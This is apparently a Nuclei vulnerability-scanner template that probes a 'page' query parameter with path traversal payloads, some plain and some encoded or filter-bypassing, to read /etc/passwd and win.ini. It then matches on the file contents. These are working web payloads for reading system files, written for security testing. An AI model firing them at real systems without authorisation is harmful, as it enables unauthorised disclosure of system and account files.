id: sr7-lfi-os-file-disclosure

info:
  name: Generic LFI - Linux or Windows File Disclosure
  author: sr7
  severity: high
  description: |
    Checks for possible local file disclosure by requesting common operating-system
    files through example query parameters. Manually verify every match.
  reference:
    - https://owasp.org/www-community/attacks/Path_Traversal
    - https://github.com/projectdiscovery/nuclei-templates/blob/main/http/vulnerabilities/generic/generic-linux-lfi.yaml
    - https://github.com/projectdiscovery/nuclei-templates/blob/main/http/vulnerabilities/generic/generic-windows-lfi.yaml
  tags: lfi,path-traversal,file-disclosure

http:
  - method: GET
    path:
      # Linux /etc/passwd: these examples assume the application uses a page parameter.
      - "{{BaseURL}}/index.php?page=../../../../../../etc/passwd"
      - "{{BaseURL}}/index.php?page=../../../../../etc/passwd"
      - "{{BaseURL}}/index.php?page=../../../../etc/passwd"
      - "{{BaseURL}}/index.php?page=../../../etc/passwd"
      - "{{BaseURL}}/index.php?page=../../etc/passwd"
      - "{{BaseURL}}/index.php?page=../etc/passwd"
      - "{{BaseURL}}/?page=../../../../../../etc/passwd"
      - "{{BaseURL}}/index.php?page=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
      - "{{BaseURL}}/index.php?page=....//....//....//....//etc/passwd"

      # Windows win.ini: adapt the path and parameter to the authorised lab.
      - "{{BaseURL}}/index.php?page=..\\..\\..\\..\\windows\\win.ini"
      - "{{BaseURL}}/index.php?page=../../../../windows/win.ini"
      - "{{BaseURL}}/?page=../../../../windows/win.ini"

    stop-at-first-match: true
    redirects: true
    max-redirects: 3

    matchers-condition: or
    matchers:
      # Match a root entry in a typical Linux /etc/passwd response.
      - type: regex
        name: linux-passwd
        part: body
        regex:
          - '(?m)^root:[^:]*:0:0:[^:]*:/root:'

      # Require both common section names to reduce Windows false positives.
      - type: word
        name: windows-winini
        part: body
        words:
          - "[fonts]"
          - "[extensions]"
        condition: and
